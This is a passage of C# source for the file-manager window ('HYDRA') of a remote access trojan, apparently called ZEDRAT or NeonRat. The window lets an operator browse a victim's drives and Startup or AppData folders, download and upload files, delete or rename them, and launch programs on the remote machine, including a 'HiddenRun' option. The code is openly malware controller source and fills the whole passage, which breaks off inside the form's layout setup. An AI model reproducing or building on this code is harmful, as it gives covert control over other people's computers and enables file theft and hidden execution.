using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Bunifu.UI.WinForms;
using Bunifu.UI.WinForms.BunifuButton;
using Guna.UI2.WinForms;
using NeonRat.Forms;


using Sockets;
using ZEDRAT.Messages;
using ZEDRAT.Module;
using ZEDRAT.TCP;
using ZEDRatApp.Forms.Remote_File_Dialog;
using ZEDRatApp.Properties;
using PictureBox = System.Windows.Forms.PictureBox;
using TextBox = System.Windows.Forms.TextBox;

namespace ZEDRatApp.Forms
{
	public class HYDRA : Form
	{
		public Bitmap obj = Resources.ResourceManager.GetObject("folder") as Bitmap;

		public Icon obj1 = Resources.ResourceManager.GetObject("unknownfile") as Icon;

		public Point formPoint;

		public bool formMove;

		public TcpClientSession _tcs;

		public Remote_File_Manager rfm;

		public object fileobj = new object();

		public bool Statusing;

		public string CurrentDirectory;

		private string strCopySrcPath;

		private bool bCopy;

		private IContainer components;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private BunifuSeparator bunifuSeparator2;

		private Guna2HtmlLabel label1hydra;

		private Guna2ControlBox guna2ControlBox1;

		private ListView lvMainTree;

		private ListView lvFileManagement;

		private Label label3;

		private Label label1;

		private ImageList imageList2;

		private ImageList imageList3;

		private ImageList imageList1;

		private TextBox txtSearchName;

		private ColumnHeader colFName;

		private ColumnHeader colFType;

		private ColumnHeader colFSize;

		private ColumnHeader colName;

		private ColumnHeader colType;

		private PictureBox picForwardFolder;

		private PictureBox picBackFolder;

		private Guna2ContextMenuStrip contextMenuStrip2;

		private ToolStripMenuItem refreshToolStripMenuItem;

		private ToolStripMenuItem copyToolStripMenuItem;

		private ToolStripMenuItem pasteToolStripMenuItem;

		private ToolStripMenuItem renameFileToolStripMenuItem;

		private ToolStripMenuItem renameFolderToolStripMenuItem;

		private ToolStripMenuItem newFolderToolStripMenuItem;

		private ToolStripMenuItem deleteToolStripMenuItem;

		private ToolStripMenuItem downloadToolStripMenuItem;

		private ToolStripMenuItem uploadToolStripMenuItem;

		private ToolStripMenuItem rarToolStripMenuItem;

		private ToolStripMenuItem rarToolStripMenuItem1;

		private ToolStripMenuItem unRarToolStripMenuItem;

		private ToolStripMenuItem runToolStripMenuItem;

		private ToolStripMenuItem runVisibleToolStripMenuItem;

		private ToolStripMenuItem runHiddenToolStripMenuItem;

		private Guna2ShadowForm guna2ShadowForm1;

		private BunifuIconButton CloseBtn;

		public HYDRA(string title, TcpClientSession tcs)
		{
			this.InitializeComponent();
			this._tcs = tcs;
			((Control)(object)this.label1hydra).Text = title;
			this.rfm = new Remote_File_Manager(this._tcs);
		}

		private void SetLastColumnWidth1()
		{
			this.lvFileManagement.Columns[this.lvFileManagement.Columns.Count - 1].Width = -2;
		}

		private void SetLastColumnWidth2()
		{
			this.lvMainTree.Columns[this.lvMainTree.Columns.Count - 1].Width = -2;
		}

		private void HYDRA_Load(object sender, EventArgs e)
		{
			this.SetLastColumnWidth1();
			this.lvFileManagement.Layout += delegate
			{
				this.SetLastColumnWidth1();
			};
			this.SetLastColumnWidth2();
			this.lvFileManagement.View = View.Details;
			this.lvFileManagement.HideSelection = false;
			this.lvFileManagement.OwnerDraw = true;
			this.lvFileManagement.BackColor = Color.FromArgb(9, 8, 13);
			this.lvFileManagement.DrawColumnHeader += delegate(object sender1, DrawListViewColumnHeaderEventArgs args)
			{
				SolidBrush brush2 = new SolidBrush(Color.FromArgb(18, 15, 24));
				args.Graphics.FillRectangle(brush2, args.Bounds);
				TextRenderer.DrawText(args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.FromArgb(226, 28, 71));
			};
			this.lvFileManagement.DrawItem += delegate(object sender1, DrawListViewItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			this.lvFileManagement.DrawSubItem += delegate(object sender1, DrawListViewSubItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			this.lvMainTree.Layout += delegate
			{
				this.SetLastColumnWidth2();
			};
			this.lvMainTree.View = View.Details;
			this.lvMainTree.HideSelection = false;
			this.lvMainTree.OwnerDraw = true;
			this.lvMainTree.BackColor = Color.FromArgb(9, 8, 13);
			this.lvMainTree.DrawColumnHeader += delegate(object sender1, DrawListViewColumnHeaderEventArgs args)
			{
				SolidBrush brush = new SolidBrush(Color.FromArgb(18, 15, 24));
				args.Graphics.FillRectangle(brush, args.Bounds);
				TextRenderer.DrawText(args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.FromArgb(226, 28, 71));
			};
			this.lvMainTree.DrawItem += delegate(object sender1, DrawListViewItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			this.lvMainTree.DrawSubItem += delegate(object sender1, DrawListViewSubItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			this._tcs._Idispatchar.Register(DataType.RemoteFileType, new Action<TcpClientSession, byte[]>(this.rfm.RemoteFileExecute));
			this.rfm._FormExecute = new Action<string, object>(HYDRA_Form);
			this.rfm.Remote_File_Send("DriveInfo", Encoding.UTF8.GetBytes("hello"));
		}

		public void HYDRA_Form(string Datatype, object obj)
		{
			try
			{
				if (Datatype != "DriveInfo")
				{
					if (Datatype != "FileList")
					{
						if (!(Datatype != "Status"))
						{
							this.HYDRA_Status(obj);
						}
					}
					else
					{
						this.HYDRA_FileList(obj);
					}
				}
				else
				{
					this.HYDRA_DriveInfo(obj as string[]);
				}
			}
			catch
			{
			}
		}

		private void HYDRA_Status(object ob)
		{
			base.Invoke((MethodInvoker)delegate
			{
				this.label3.Text = "Status :" + ob;
				lock (this.fileobj)
				{
					this.Statusing = false;
				}
			});
		}

		private void HYDRA_FileList(object ob)
		{
			base.Invoke((MethodInvoker)delegate
			{
				try
				{
					this.lvFileManagement.Items.Clear();
					this.imageList2.Images.Clear();
					List<RemoteFilesList> list = ob as List<RemoteFilesList>;
					this.imageList2.Images.Add(this.obj);
					RemoteFilesList remoteFilesList = list[0];
					string[] array = remoteFilesList.FileName.Split('|');
					this.CurrentDirectory = remoteFilesList.Type;
					string[] array2 = array;
					foreach (string value in array2)
					{
						if (!string.IsNullOrEmpty(value))
						{
							this.lvFileManagement.Items.Add(new ListViewItem
							{
								Text = value,
								SubItems = { "", "DIR" },
								ImageIndex = 0
							});
						}
					}
					list.Remove(remoteFilesList);
					foreach (RemoteFilesList item in list)
					{
						ListViewItem value2 = new ListViewItem
						{
							Text = item.FileName,
							SubItems = { item.Size, item.Type },
							ImageIndex = this.imageList2.Images.Count
						};
						this.imageList2.Images.Add(item.FileIcon ?? this.obj1.ToBitmap());
						this.lvFileManagement.Items.Add(value2);
					}
					this.label1.Text = "File:[ " + (this.lvFileManagement.Items.Count - 1) + " ]";
					this.label3.Text = "Status :Successful Operation.";
					this.txtSearchName.Text = this.CurrentDirectory;
					lock (this.fileobj)
					{
						this.Statusing = false;
					}
				}
				catch
				{
				}
			});
		}

		private void HYDRA_DriveInfo(string[] DrivesList)
		{
			try
			{
				base.Invoke((MethodInvoker)delegate
				{
					for (int i = 0; i < DrivesList.Length; i += 2)
					{
						this.lvMainTree.Items.Add(new ListViewItem
						{
							Text = DrivesList[i].Replace("\\", ""),
							SubItems = { Enum.GetName(typeof(DriveType), int.Parse(DrivesList[i + 1])) },
							ImageIndex = 0
						});
					}
					string[] array = new string[4] { "Desktop", "Startup", "ProgramFiles", "ApplicationData" };
					foreach (string text in array)
					{
						this.lvMainTree.Items.Add(new ListViewItem
						{
							Text = text,
							SubItems = { "DIR" },
							ImageIndex = 1
						});
					}
				});
			}
			catch
			{
			}
		}

		private void HYDRA_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				this._tcs?._Idispatchar?.Unregister(DataType.RemoteFileType);
				this.rfm?.destroy();
				this.obj?.Dispose();
				this.obj1?.Dispose();
			}
			catch
			{
			}
			finally
			{
				this.obj = null;
				this.obj1 = null;
				this._tcs = null;
				this.rfm = null;
				GC.Collect();
			}
		}

		private void listView1_MouseDoubleClick(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.GetSelectedItems())
				{
					ListViewItem listViewItem = this.lvMainTree.SelectedItems[0];
					string text = listViewItem.SubItems[0].Text;
					this.rfm.Remote_File_Send("FileList", Encoding.UTF8.GetBytes(text switch
					{
						"ProgramFiles" => Enum.GetName(typeof(Environment.SpecialFolder), 38), 
						"ApplicationData" => Enum.GetName(typeof(Environment.SpecialFolder), 26), 
						"Startup" => Enum.GetName(typeof(Environment.SpecialFolder), 7), 
						"Desktop" => Enum.GetName(typeof(Environment.SpecialFolder), 0), 
						_ => listViewItem.Text + "\\", 
					}));
					this.label3.Text = "Status :Waiting for result....";
				}
			}
			catch
			{
				lock (this.fileobj)
				{
					this.Statusing = false;
				}
			}
		}

		private void lvFileManagement_MouseDoubleClick(object sender, MouseEventArgs e)
		{
			try
			{
				string command = "FileList";
				if (!this.GetSelectedItems())
				{
					return;
				}
				ListViewItem listViewItem = this.lvFileManagement.SelectedItems[0];
				string s = null;
				if (listViewItem.Text.Equals("..") && this.lvFileManagement.Items[0].Equals(listViewItem))
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(this.CurrentDirectory);
					if (directoryInfo.Parent == null)
					{
						new Exception();
					}
					s = directoryInfo.Parent.FullName;
				}
				if (listViewItem.SubItems[2].Text.Equals("DIR") && !this.lvFileManagement.Items[0].Equals(listViewItem))
				{
					s = this.CurrentDirectory + "\\" + listViewItem.Text;
				}
				if (listViewItem.SubItems[2].Text.Equals("jpg") || listViewItem.SubItems[2].Text.Equals("png") || listViewItem.SubItems[2].Text.Equals("gif") || listViewItem.SubItems[2].Text.Equals("jpeg") || listViewItem.SubItems[2].Text.Equals("bmp"))
				{
					command = "Geticon";
					s = this.CurrentDirectory + "\\" + listViewItem.Text;
					this.rfm.GetIcon = listViewItem.Text;
				}
				if (listViewItem.SubItems[2].Text.Equals("txt"))
				{
					command = "GetTxt";
					s = this.CurrentDirectory + "\\" + listViewItem.Text;
				}
				this.rfm.Remote_File_Send(command, Encoding.UTF8.GetBytes(s));
				this.label3.Text = "Status :Waiting for result....";
			}
			catch
			{
				lock (this.fileobj)
				{
					this.Statusing = false;
				}
			}
		}

		private bool GetSelectedItems()
		{
			if (this.lvMainTree.SelectedItems.Count == 0)
			{
				return false;
			}
			lock (this.fileobj)
			{
				if (this.Statusing)
				{
					return false;
				}
				this.Statusing = true;
			}
			return true;
		}

		private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.GetSelectedItems())
				{
					ListViewItem listViewItem = this.lvFileManagement.SelectedItems[0];
					if ((listViewItem.Text.Equals("..") && this.lvFileManagement.Items[0].Equals(listViewItem)) || MessageBox.Show("Are you sure you want to delete:" + listViewItem.Text, "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Hand) != DialogResult.Yes)
					{
						throw new Exception();
					}
					this.rfm.Remote_File_Send("DeleteFile", Encoding.UTF8.GetBytes(this.CurrentDirectory + "\\" + listViewItem.Text));
					this.label3.Text = "Status :Waiting for result....";
				}
			}
			catch
			{
				lock (this.fileobj)
				{
					this.Statusing = false;
				}
			}
		}

		private void 刷新ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				lock (this.fileobj)
				{
					if (this.Statusing)
					{
						return;
					}
					this.Statusing = true;
				}
				this.lvFileManagement.Items.Clear();
				this.imageList2.Images.Clear();
				this.rfm.Remote_File_Send("FileList", Encoding.UTF8.GetBytes(this.CurrentDirectory));
				this.label3.Text = "Status :Waiting for result....";
			}
			catch
			{
				lock (this.fileobj)
				{
					this.Statusing = false;
				}
			}
		}

		private void copyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				lock (this.fileobj)
				{
					ListViewItem listViewItem = this.lvFileManagement.SelectedItems[0];
					this.bCopy = true;
					this.strCopySrcPath = this.CurrentDirectory + "\\" + listViewItem.Text;
				}
				this.label3.Text = "Status :Waiting for result....";
			}
			catch
			{
				lock (this.fileobj)
				{
					this.Statusing = false;
				}
			}
		}

		private void pasteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				lock (this.fileobj)
				{
					if (!this.bCopy)
					{
						return;
					}
					this.bCopy = false;
					string text = this.CurrentDirectory;
					if (this.lvFileManagement.SelectedItems.Count > 0)
					{
						text = string.Concat(str2: this.lvFileManagement.SelectedItems[0].Text, str0: this.CurrentDirectory, str1: "\\");
					}
					this.rfm.Remote_File_Send("CopyPaste", Encoding.UTF8.GetBytes(this.strCopySrcPath + "|" + text));
					this.label3.Text = "Status :Waiting for result....";
				}
				this.label3.Text = "Status :Waiting for result....";
			}
			catch
			{
				lock (this.fileobj)
				{
					this.Statusing = false;
				}
			}
		}

		private void renameToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				ListViewItem listViewItem = this.lvFileManagement.SelectedItems[0];
				Rename rename = new Rename();
				if ((listViewItem.Text.Equals("..") && this.lvFileManagement.Items[0].Equals(listViewItem)) || rename.ShowDialog() != DialogResult.OK || string.IsNullOrEmpty(rename.FileName))
				{
					throw new Exception();
				}
				this.rfm.Remote_File_Send("Rename", Encoding.UTF8.GetBytes(this.CurrentDirectory + "\\" + listViewItem.Text + "|" + this.CurrentDirectory + "\\" + rename.FileName));
				this.lvFileManagement.SelectedItems[0].Text = rename.FileName;
			}
			catch
			{
				lock (this.fileobj)
				{
					this.Statusing = false;
				}
			}
		}

		private void renameDirectToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.GetSelectedItems())
				{
					this.lvFileManagement.LabelEdit = true;
					this.lvFileManagement.SelectedItems[0].BeginEdit();
				}
			}
			catch
			{
				lock (this.fileobj)
				{
					this.Statusing = false;
				}
			}
		}

		private void lvFileManagement_LabelEdit(object sender, LabelEditEventArgs e)
		{
			try
			{
				ListViewItem listViewItem = this.lvFileManagement.SelectedItems[0];
				this.rfm.Remote_File_Send("Rename", Encoding.UTF8.GetBytes(this.CurrentDirectory + "\\" + listViewItem.Text + "|" + this.CurrentDirectory + "\\" + e.Label));
				this.label3.Text = "Status :Waiting for result....";
			}
			catch
			{
				lock (this.fileobj)
				{
					this.Statusing = false;
				}
			}
		}

		private void newFrolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				lock (this.fileobj)
				{
					if (this.Statusing)
					{
						return;
					}
					this.Statusing = true;
				}
				NewFolder newFolder = new NewFolder();
				if (string.IsNullOrEmpty(this.CurrentDirectory) || newFolder.ShowDialog() != DialogResult.OK || string.IsNullOrEmpty(newFolder.FodlerName))
				{
					lock (this.fileobj)
					{
						this.Statusing = false;
						return;
					}
				}
				this.rfm.Remote_File_Send("NewFolder", Encoding.UTF8.GetBytes(this.CurrentDirectory + "\\" + newFolder.FodlerName));
				this.label3.Text = "Status :Waiting for result....";
			}
			catch
			{
				lock (this.fileobj)
				{
					this.Statusing = false;
				}
			}
		}

		private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (!this.GetSelectedItems())
				{
					return;
				}
				ListViewItem listViewItem = this.lvFileManagement.SelectedItems[0];
				if (listViewItem.SubItems[2].Text.Equals("DIR"))
				{
					lock (this.fileobj)
					{
						this.Statusing = false;
						return;
					}
				}
				new FileDownload(this.rfm, this.CurrentDirectory + "\\" + listViewItem.Text).ShowDialog();
				lock (this.fileobj)
				{
					this.Statusing = false;
				}
				GC.Collect();
			}
			catch
			{
				lock (this.fileobj)
				{
					this.Statusing = false;
				}
			}
		}

		private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (string.IsNullOrEmpty(this.CurrentDirectory))
				{
					return;
				}
				lock (this.fileobj)
				{
					if (this.Statusing)
					{
						return;
					}
					this.Statusing = true;
				}
				new FileUpload(this.rfm, this.CurrentDirectory).ShowDialog();
				lock (this.fileobj)
				{
					this.Statusing = false;
				}
				GC.Collect();
			}
			catch
			{
				lock (this.fileobj)
				{
					this.Statusing = false;
				}
			}
		}

		private void rARToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.GetSelectedItems())
				{
					ListViewItem listViewItem = this.lvFileManagement.SelectedItems[0];
					string text = Path.GetExtension(listViewItem.Text).Replace(".", "").ToLower() ?? null;
					if ((listViewItem.Text.Equals("..") && this.lvFileManagement.Items[0].Equals(listViewItem)) || text.Equals("zip") || text.Equals("rar") || text.Equals("7z") || text.Equals("cab") || text.Equals("iso"))
					{
						throw new Exception();
					}
					this.rfm.Remote_File_Send("ZipFile", Encoding.UTF8.GetBytes(this.CurrentDirectory + "\\" + listViewItem.Text));
					this.label3.Text = "Status :Waiting for result....";
				}
			}
			catch
			{
				lock (this.fileobj)
				{
					this.Statusing = false;
				}
			}
		}

		private void unrarToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.GetSelectedItems())
				{
					ListViewItem listViewItem = this.lvFileManagement.SelectedItems[0];
					string text = Path.GetExtension(listViewItem.Text).Replace(".", "").ToLower() ?? null;
					if (!text.Equals("zip") && !text.Equals("rar") && !text.Equals("7z") && !text.Equals("cab") && !text.Equals("iso"))
					{
						throw new Exception();
					}
					this.rfm.Remote_File_Send("UnZipFile", Encoding.UTF8.GetBytes(this.CurrentDirectory + "\\" + listViewItem.Text));
					this.label3.Text = "Status :Waiting for result....";
				}
			}
			catch
			{
				lock (this.fileobj)
				{
					this.Statusing = false;
				}
			}
		}

		private void displayRunToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (!this.GetSelectedItems())
				{
					return;
				}
				ListViewItem listViewItem = this.lvFileManagement.SelectedItems[0];
				if (listViewItem.SubItems[2].Text.Equals("DIR"))
				{
					lock (this.fileobj)
					{
						this.Statusing = false;
						return;
					}
				}
				this.rfm.Remote_File_Send("Run", Encoding.UTF8.GetBytes(this.CurrentDirectory + "\\" + listViewItem.Text));
				this.label3.Text = "Status :Waiting for result....";
			}
			catch
			{
				lock (this.fileobj)
				{
					this.Statusing = false;
				}
			}
		}

		private void hiddenRunToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (!this.GetSelectedItems())
				{
					return;
				}
				ListViewItem listViewItem = this.lvFileManagement.SelectedItems[0];
				if (listViewItem.SubItems[2].Text.Equals("DIR"))
				{
					lock (this.fileobj)
					{
						this.Statusing = false;
						return;
					}
				}
				this.rfm.Remote_File_Send("HiddenRun", Encoding.UTF8.GetBytes(this.CurrentDirectory + "\\" + listViewItem.Text));
				this.label3.Text = "Status :Waiting for result....";
			}
			catch
			{
				lock (this.fileobj)
				{
					this.Statusing = false;
				}
			}
		}

		private void picForwardFolder_Click(object sender, EventArgs e)
		{
			try
			{
				string text = string.Concat(str2: this.lvFileManagement.SelectedItems[0].Text, str0: this.CurrentDirectory, str1: "\\");
				if ((File.GetAttributes(text) & FileAttributes.Directory) != FileAttributes.Directory)
				{
					return;
				}
				lock (this.fileobj)
				{
					if (this.Statusing)
					{
						return;
					}
					this.Statusing = true;
				}
				if (string.IsNullOrEmpty(text) || !text.Contains(":"))
				{
					throw new Exception();
				}
				this.rfm.Remote_File_Send("FileList", Encoding.UTF8.GetBytes(text));
				this.label3.Text = "Status :Waiting for result....";
			}
			catch
			{
				lock (this.fileobj)
				{
					this.Statusing = false;
				}
			}
		}

		private void picBackFolder_Click(object sender, EventArgs e)
		{
			try
			{
				DirectoryInfo directoryInfo = Directory.GetParent(this.CurrentDirectory);
				if (directoryInfo == null)
				{
					return;
				}
				lock (this.fileobj)
				{
					if (this.Statusing)
					{
						return;
					}
					this.Statusing = true;
				}
				string fullName = directoryInfo.FullName;
				if (string.IsNullOrEmpty(fullName) || !fullName.Contains(":"))
				{
					throw new Exception();
				}
				this.rfm.Remote_File_Send("FileList", Encoding.UTF8.GetBytes(fullName));
				this.label3.Text = "Status :Waiting for result....";
			}
			catch
			{
				lock (this.fileobj)
				{
					this.Statusing = false;
				}
			}
		}

		private void listView1_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
		{
			using SolidBrush brush = new SolidBrush(HYDRAUI.m_ThemeColor);
			using SolidBrush brush2 = new SolidBrush(Color.White);
			e.DrawBackground();
			e.Graphics.FillRectangle(brush, e.Bounds);
			e.Graphics.DrawRectangle(new Pen(Color.Black), new Rectangle(e.Bounds.Left - 1, e.Bounds.Top - 1, e.Bounds.Width - 1, e.Bounds.Height - 1));
			Font font = new Font("Italic", 9f, FontStyle.Bold);
			e.Graphics.DrawString(e.Header.Text, font, brush2, e.Bounds);
		}

		private void listView1_DrawItem(object sender, DrawListViewItemEventArgs e)
		{
			if (!e.Item.Selected)
			{
				e.DrawDefault = true;
			}
		}

		private void listView1_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
		{
			using SolidBrush brush = new SolidBrush(Color.FromArgb(190, 190, 190));
			if (e.Item.Selected)
			{
				e.Graphics.FillRectangle(brush, e.Bounds);
				TextRenderer.DrawText(e.Graphics, e.SubItem.Text, new Font("Century Gothic", 8f, FontStyle.Regular), new Point(e.Bounds.Left + 3, e.Bounds.Top + 2), Color.FromArgb(17, 17, 17));
			}
			else
			{
				e.DrawDefault = true;
			}
		}

		private void lvFileManagement_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
		{
			this.listView1_DrawColumnHeader(sender, e);
		}

		private void lvFileManagement_DrawItem(object sender, DrawListViewItemEventArgs e)
		{
			this.listView1_DrawItem(sender, e);
		}

		private void lvFileManagement_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
		{
			this.listView1_DrawSubItem(sender, e);
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
									this.components = new System.ComponentModel.Container();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(ZEDRatApp.Forms.HYDRA));
			this.guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
			this.bunifuSeparator2 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.label1hydra = new Guna2HtmlLabel();
			this.guna2ControlBox1 = new Guna.UI2.WinForms.Guna2ControlBox();
			this.lvMainTree = new System.Windows.Forms.ListView();
			this.colName = new System.Windows.Forms.ColumnHeader();
			this.colType = new System.Windows.Forms.ColumnHeader();
			this.imageList3 = new System.Windows.Forms.ImageList(this.components);
			this.lvFileManagement = new System.Windows.Forms.ListView();
			this.colFName = new System.Windows.Forms.ColumnHeader();
			this.colFType = new System.Windows.Forms.ColumnHeader();
			this.colFSize = new System.Windows.Forms.ColumnHeader();
			this.contextMenuStrip2 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
			this.refreshToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.copyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.pasteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.renameFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.renameFolderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.newFolderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.deleteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.downloadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.uploadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.rarToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.rarToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			this.unRarToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.runToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.runVisibleToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.runHiddenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.imageList2 = new System.Windows.Forms.ImageList(this.components);
			this.label1 = new System.Windows.Forms.Label();
			this.label3 = new System.Windows.Forms.Label();
			this.imageList1 = new System.Windows.Forms.ImageList(this.components);
			this.txtSearchName = new System.Windows.Forms.TextBox();
			this.picBackFolder = new System.Windows.Forms.PictureBox();
			this.picForwardFolder = new System.Windows.Forms.PictureBox();
			this.guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(this.components);
			this.CloseBtn = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.contextMenuStrip2.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)this.picBackFolder).BeginInit();
			((System.ComponentModel.ISupportInitialize)this.picForwardFolder).BeginInit();
			base.SuspendLayout();
			this.guna2BorderlessForm1.ContainerControl = this;
			this.bunifuSeparator2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator2.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator2.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator2.BackgroundImage");
			this.bunifuSeparator2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator2.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator2.LineColor = System.Drawing.Color.DimGray;
			this.bunifuSeparator2.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.DoubleEdgeFaded;
			this.bunifuSeparator2.LineThickness = 1;
			this.bunifuSeparator2.Location = new System.Drawing.Point(0, 52);
			this.bunifuSeparator2.Margin = new System.Windows.Forms.Padding(6, 2, 6, 2);
			this.bunifuSeparator2.Name = "bunifuSeparator2";
			this.bunifuSeparator2.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator2.Size = new System.Drawing.Size(991, 9);
			this.bunifuSeparator2.TabIndex = 98;
			((System.Windows.Forms.Control)(object)this.label1hydra).BackColor = System.Drawing.Color.Transparent;
			this.label1hydra.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.label1hydra.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.label1hydra).Location = new System.Drawing.Point(53, 24);
			((System.Windows.Forms.Control)(object)this.label1hydra).Name = "label1hydra";
			((System.Windows.Forms.Control)(object)this.label1hydra).Size = new System.Drawing.Size(104, 23);
			((System.Windows.Forms.Control)(object)this.label1hydra).TabIndex = 97;
			((System.Windows.Forms.Control)(object)this.label1hydra).Text = "File Manager";
			this.guna2ControlBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.guna2ControlBox1.BorderColor = System.Drawing.Color.DarkGray;
			this.guna2ControlBox1.BorderRadius = 12;
			this.guna2ControlBox1.FillColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ControlBox1.HoverState.Parent = this.guna2ControlBox1;
			this.guna2ControlBox1.IconColor = System.Drawing.Color.Black;
			this.guna2ControlBox1.Location = new System.Drawing.Point(935, 12);
			this.guna2ControlBox1.Name = "guna2ControlBox1";
			this.guna2ControlBox1.ShadowDecoration.Parent = this.guna2ControlBox1;
			this.guna2ControlBox1.Size = new System.Drawing.Size(45, 29);
			this.guna2ControlBox1.TabIndex = 95;
			this.lvMainTree.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.lvMainTree.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.lvMainTree.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
			this.lvMainTree.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { this.colName, this.colType });
			this.lvMainTree.ForeColor = System.Drawing.Color.White;
			this.lvMainTree.HideSelection = false;
			this.lvMainTree.Location = new System.Drawing.Point(12, 73);
			this.lvMainTree.Name = "lvMainTree";
			this.lvMainTree.Size = new System.Drawing.Size(163, 450);
			this.lvMainTree.SmallImageList = this.imageList3;
			this.lvMainTree.TabIndex = 99;
			this.lvMainTree.UseCompatibleStateImageBehavior = false;
			this.lvMainTree.View = System.Windows.Forms.View.Details;
			this.lvMainTree.DrawColumnHeader += new System.Windows.Forms.DrawListViewColumnHeaderEventHandler(listView1_DrawColumnHeader);
			this.lvMainTree.DrawItem += new System.Windows.Forms.DrawListViewItemEventHandler(listView1_DrawItem);
			this.lvMainTree.DrawSubItem += new System.Windows.Forms.DrawListViewSubItemEventHandler(listView1_DrawSubItem);
			this.lvMainTree.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(listView1_MouseDoubleClick);
			this.colName.Text = "Name";
			this.colName.Width = 94;
			this.colType.Text = "Type";
			this.colType.Width = 68;
			this.imageList3.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageList3.ImageStream");
			this.imageList3.TransparentColor = System.Drawing.Color.Transparent;
			this.imageList3.Images.SetKeyName(0, "folder.png");
			this.imageList3.Images.SetKeyName(1, "folder1.png");
			this.lvFileManagement.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.lvFileManagement.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.lvFileManagement.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
			this.lvFileManagement.Columns.AddRange(new System.Windows.Forms.ColumnHeader[3] { this.colFName, this.colFType, this.colFSize });
			this.lvFileManagement.ContextMenuStrip = this.contextMenuStrip2;
